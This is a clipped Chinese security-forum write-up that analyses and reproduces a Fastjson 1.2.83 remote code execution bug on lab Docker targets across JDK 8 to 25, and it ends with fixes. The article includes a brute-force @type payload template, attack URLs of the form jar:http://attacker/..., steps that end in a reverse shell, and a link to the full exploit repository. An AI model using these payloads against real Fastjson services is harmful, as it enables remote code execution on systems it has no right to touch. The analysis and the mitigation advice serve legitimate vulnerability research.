---
title: Fastjson 1.2.83 RCE全版本复现（本人两台真实环境）-先知社区
source: https://xz.aliyun.com/news/92583
source_host: xz.aliyun.com
clip_date: 2026-07-27T17:48:41+08:00
trace_id: cc5df854-0e49-46a9-beb0-fc6ea3e5099e
content_hash: bdc015111b1fb0be22e5e082e9a87fa10c3c96485d810f52a39540bdd2930867
status: synced
tags:
  - 漏洞分析
  - Fastjson漏洞
series: null
feed_source: 先知安全技术社区
ai_summary: Fastjson 1.2.66–1.2.83 可利用 @JSONType 注解的信任逻辑倒置，结合 Spring Boot 的 LaunchedURLClassLoader 实现无需 AutoType 的远程代码执行。
ai_summary_style: key-points
images_status:
  total: 15
  succeeded: 1
  failed_urls:
    - https://xzfile.aliyuncs.com/media/upload/picture/20260726121232-393ca5fc-88a8-1.png
    - https://xzfile.aliyuncs.com/media/upload/picture/20260726121233-3a417ecf-88a8-1.png
    - https://xzfile.aliyuncs.com/media/upload/picture/20260726121234-3a8696f2-88a8-1.png
    - https://xzfile.aliyuncs.com/media/upload/picture/20260726121236-3bc4b81e-88a8-1.png
    - https://xzfile.aliyuncs.com/media/upload/picture/20260726121236-3bf81222-88a8-1.png
    - https://xzfile.aliyuncs.com/media/upload/picture/20260726121238-3ce357e8-88a8-1.png
    - https://xzfile.aliyuncs.com/media/upload/picture/20260726121238-3d1dfd50-88a8-1.png
    - https://xzfile.aliyuncs.com/media/upload/picture/20260726121238-3d500ea7-88a8-1.png
    - https://xzfile.aliyuncs.com/media/upload/picture/20260726121241-3e8f5f1b-88a8-1.png
    - https://xzfile.aliyuncs.com/media/upload/picture/20260726121241-3ecf3533-88a8-1.png
    - https://xzfile.aliyuncs.com/media/upload/picture/20260726121241-3f03b433-88a8-1.png
    - https://xzfile.aliyuncs.com/media/upload/picture/20260726121242-3f4587a1-88a8-1.png
    - https://xzfile.aliyuncs.com/media/upload/picture/20260726121242-3f832a88-88a8-1.png
    - https://xzfile.aliyuncs.com/media/upload/picture/20260726121243-3fb7da1e-88a8-1.png
notion_page_id: 3ab75244-d011-8192-b474-e4b802e232fa
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Fastjson 1.2.66–1.2.83 可利用 @JSONType 注解的信任逻辑倒置，结合 Spring Boot 的 LaunchedURLClassLoader 实现无需 AutoType 的远程代码执行。
> 
> - **漏洞核心：** Fastjson 将攻击者控制的 `@type` 值直接拼成资源路径，通过 `getResourceAsStream` 加载远程 `.class` 文件，并错误地把该文件自带的 `@JSONType` 注解当作可信标志，从而放行类加载与初始化，触发 `<clinit>` 中的恶意代码。
> - **利用条件：** 应用运行在 JDK 环境，且使用 Spring Boot FatJar（`LaunchedURLClassLoader`）；SafeMode 开启可阻断，但默认关闭。
> - **关键危害：** 即使 `autoTypeSupport=false`（AutoType 关闭），只要扫描到 `@JSONType` 注解，条件 `autoTypeSupport || jsonType` 依然成立，导致直接调用 `TypeUtils.loadClass()`，完全绕过类型检查。
> - **攻击手法：** JDK8 下可直接通过 `jar:http://attacker/...` 远程加载恶意类；JDK17+ 需先将恶意 JAR 下载到本地，再通过枚举 `/proc/self/fd/N` 文件描述符触发加载。
> - **修复方案：** 升级到 fastjson 1.2.84 或 fastjson2，或强制启用 SafeMode：`-Dfastjson.parser.safeMode=true`。

声明：

1、本文使用本人的真机仅进行复现且已打码

2、复现所需文件已大包上传：

[

https://github.com/Ameng052/Fastjson1.2.83_RCE_Full_Version

](https://github.com/Ameng052/Fastjson1.2.83_RCE_Full_Version)

3、本文（含所有代码、命令、操作步骤及技术描述）仅供网络安全研究、教学、授权渗透测试及防御加固使用。

漏洞说明

fastjson 1.2.66 ~ 1.2.83

版本存在远程代码执行漏洞。攻击者可通过构造特定

JSON数据

，利用

@JSONType

注解探测路径漏洞绕过

checkAutoType

安全检查，配合

Spring Boot

的

LaunchedURLClassLoader

会远程加载恶意类并执行

<clinit>

完成 RCE。该漏洞无需启用 AutoType 即可利用，影响所有使用受影响版本且未开启 SafeMode 的应用。

漏洞发现作者：

![image.png](⚠️ https://xzfile.aliyuncs.com/media/upload/picture/20260726121232-393ca5fc-88a8-1.png)

受影响版本与利用条件

|     |     |
| --- | --- | 
| 项目  | 详情  |
| 受影响版本 | fastjson 1.2.66 ~ 1.2.83 |
| 不受影响版本 | fastjson ≤ 1.2.65、fastjson ≥ 1.2.84、fastjson2 全版本 |
| CVSS 3.1 | 9.8 (Critical) |
| 利用前提 | JDK + Spring Boot FatJar |
| SafeMode | 开启后可阻断此漏洞 |

漏洞分析

漏洞本质

攻击者控制

@type

→ Fastjson 在完成类型授权前读取对应

.class

资源 → 将该资源自身携带的

@JSONType

注解当作可信标志 → 加载并实例化攻击者类，触发

<clinit>

静态初始化代码。

源码分析

checkAutoType()

入口

SafeMode

判断

计算

autoTypeSupport

白名单、黑名单、缓存判断

4个硬编码白名单

点击跳转

根本缺陷1：读取攻击者指定的.class 资源

1

把 @type 的值直接当成资源名：

typeName.replace('.', '/') + ".class"

。

2

通过

defaultClassLoader.getResourceAsStream(...)

去加载这个资源。

3

如果

ClassLoader

是

Spring Boot

的

LaunchedURLClassLoader

（几乎所有 Fat JAR 都会用），它支持

jar:http://

、

jar:file:

、

jar:file:/proc/self/fd/N

等特殊 URL 协议。

4

攻击者只要让

typeName

变成类似

jar:http://attacker:port/xxx!/

恶意类名 的形式，就会触发

远程 JAR 拉取

。

5

拉取到的字节码被

ClassReader + TypeCollector

扫描，判断是否带有

@JSONType

注解。

6

只要扫描结果

jsonType == true

，就会进入后续真正的类加载。

根本缺陷2：发现

@JSONType

后加载类

在 AutoType 关闭时：

但只要远程 class 文件带有

@JSONType

：

条件仍然成立：

于是 Fastjson 会调用：

这形成了一个严重的信任逻辑倒置。

正常安全逻辑应当是：

Fastjson 1.2.83 的实际逻辑却是：

也就是说：

攻击者既控制待验证对象，也控制用于通过验证的“可信标志”。

@JSONType

本来只是一个功能性注解，却被错误地承担了安全授权作用。

绕过

AutoType

关闭状态

绕过原理

：

1

autoTypeSupport

默认是

false

（系统属性 fastjson.parser.autoTypeSupport 未设为 true）。

2

即使

autoTypeSupport == false

，只要探测阶段返回

jsonType == true

（即目标资源带有

@JSONType

注解），条件

autoTypeSupport || jsonType || expectClassFlag

就会成立。

3

随后直接调用

TypeUtils.loadClass(...)

，进入真正的类加载与初始化。

因此

：关闭

AutoType

并不能

阻止带

@JSONType

注解的类被加载。 这是漏洞能够在“类型绑定 + AutoType 关闭”场景下成立的根本原因。

防护检查，但发生得过晚

源码中存在多层防护

|     |     |     |     |
| --- | --- | --- | --- |   
| 检查点 | 代码位置 | 发生时机 | 问题  |
| safeMode | 方法最前面 | 最早  | 默认关闭。一旦开启可直接阻断，但绝大多数环境未开启 |
| 长度限制 | typeName.length() >= 192 \| < 3 | 较早  | 只拦超长/过短字符串，对正常长度的<br><br>jar:...<br><br>无效 |
| hash 黑名单<br><br>（denyHashCodes / internalDenyHashCodes） | 中前段 | 中等  | 主要针对普通类名哈希，对<br><br>jar:http://<br><br>、<br><br>jar:file:/proc/self/fd/N<br><br>这类特殊字符串匹配困难 |
| 白名单<br><br>（acceptHashCodes） | 同上  | 中等  | 仅加速放行，不构成拦截 |
| @JSONType 探测后的 loadClass | 后半段 | 过晚  | 此时资源已经通过 ClassLoader 拉取，恶意类可能已经执行了静态初始化块 |
| 最后的<br><br>!autoTypeSupport<br><br>抛异常 | 方法末尾 | 最晚  | 恶意代码已在前面的<br><br>loadClass<br><br>阶段执行完毕 |

●

真正危险的动作（

getResourceAsStream

→ 远程/FD 资源拉取 →

ClassReader

扫描 →

loadClass

）发生在黑名单/白名单检查之后、最终

!autoTypeSupport

抛异常之前。

●

一旦

jsonType == true

，就会进入

TypeUtils.loadClass

，此时类初始化（

<clinit>

）已经可能完成。

●

后续的

ClassCastException

（在类型绑定场景下）只是“事后”现象，无法阻止已执行的代码。

FD组合链的关键条件

1

当

typeName

为

jar:file:/proc/self/fd/123!/com/example/Poc

这类字符串时，

replace('.', '/')

后变成资源路径。

2

defaultClassLoader.getResourceAsStream(...)

会把这个路径交给当前

ClassLoader

（必须是 LaunchedURLClassLoader）。

3

Spring Boot 的

LaunchedURLClassLoader

\+ 已注册的

jar:

协议处理器，能够识别

/proc/self/fd/N

并打开对应的已保留文件描述符。

两种利用手法

JDK8 HTTP 短链模式

：

其中

2130706433

是

127.0.0.1

的⼗进制整数表示（⽤于绕过点号替换逻辑）。

payload识别后会直接拉取我们构造好的恶意

class

文件并加载，JDK8 的

LaunchedURLClassLoader

支持 HTTP resource。

FD 枚举模式（JDK17/21/25）：

先通过 HTTP 下载 JAR，再通过

/proc/self/fd/

枚举引用已下载的 JAR。

对应使用模式

|     |     |     |
| --- | --- | --- |  
| 模式  | 适用 JDK | 过程  |
| jdk8-http | JDK 8 | 直接拉取 class 并加载执行 |
| fd  | JDK 17/21/25 | 先拉取 JAR 恶意类，再枚举<br><br>/proc/self/fd/N<br><br>加载 |

JDK 8 复现（jdk8-http 模式）

靶机

部署命令

文件分析

●

基础镜像

：eclipse-temurin:8-jdk（明确锁定 JDK 8）。

●

依赖

：

○

fastjson-1.2.83.jar

（存在漏洞的版本）

○

spring-boot-loader-2.7.18.jar（提供

LaunchedURLClassLoader

和

JarFile

协议处理器）

●

编译

：使用

\-XDignore.symbol.file

绕过部分内部 API 限制，classpath 包含上述两个 JAR。

●

运行

：

classpath

包含

lib

和

classes

，通过系统属性传入端口和

fastjson

路径。

靶机环境详解

攻击机

脚本一键攻击

成功反弹shell

靶机docker日志

恶意类编写详解

☆☆☆手动攻击

注意踩坑：类只会被定义和初始化一次，第二次攻击只是缓存命中，JVM 不会重复执行静态代码，重启靶机即可恢复可重复利用的状态。

1

靶机docker重启

2

攻击机开启http服务

3

使用自动化脚本生成的payload：

4

成功反弹shell

JDK 17 复现（fd 模式）

靶场

靶机docker日志

攻击机

成功反弹shell

☆☆☆手动攻击

1

重启靶机

2

使用自动化脚本生成的payload的，恶意类生成在

./RCE/poc/www/

目录下

3

发包让靶机下载恶意类

注：返回包设置过，会直接回显下载位置

或者使用批量爆破：

{"@type": "jar:file:.proc.self.fd.{{int::fd(3-256)}}!.fd{{int::fd(3-256)}}.Tt1784975521_fdException"}

4

直接访问加载触发恶意类

5

成功触发反弹shell

6

查看docker日志

靶机环境详解

位置：

Fastjson1.2.83_RCE_Full_Version/target/jdk17/src/main/java/lab/modernfd/

|     |     |     |
| --- | --- | --- |  
| 文件  | 职责  | 与漏洞的关系 |
| BoundEnvelope.java | 定义固定 DTO，提供<br><br>List<Object> value<br><br>通道 | 让多个<br><br>@type<br><br>能在一次请求中被处理 |
| ModernFdApplication.java | 启动时强制 autoType=false，支持 safeMode 开关 | 保证实验前提正确 |
| ParseController.java | /parse<br><br>接口执行<br><br>JSON.parseObject(body, BoundEnvelope.class) | 真正的 Sink<br><br>，触发 checkAutoType 探测 |

JDK 21 复现（fd 模式）

靶机

靶机docker日志

攻击机

手动攻击方式同JDK 17

JDK 25 复现（fd 模式）

靶机

靶机docker日志

攻击机

手动攻击方式同JDK 17

全版本复现结果总结

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/1cdcf601c4be4ea1.png)

|     |     |     |     |     |
| --- | --- | --- | --- | --- |    
| JDK 版本 | 精确版本 | 模式  | SSRF | RCE（文件写入） |
| JDK 8 | 1.8.0_492 | jdk8-http | 成功  | 成功  |
| JDK 17 | 17.0.19 | fd  | 成功  | 成功  |
| JDK 21 | 21.0.11 | fd  | 成功  | 成功  |
| JDK 25 | 25.0.3 | fd  | 成功  | 成功  |

修复建议

1

启用 SafeMode

：

\-Dfastjson.parser.safeMode=true

2

升级 fastjson 到 1.2.84 或迁移到 fastjson2

3

拦截包含

jar:http

的请求

致谢

https://github.com/DmTomHL/fastjson-1.2.83-gadget-rce

https://github.com/dinosn/fastjson-jsontype-rce-lab
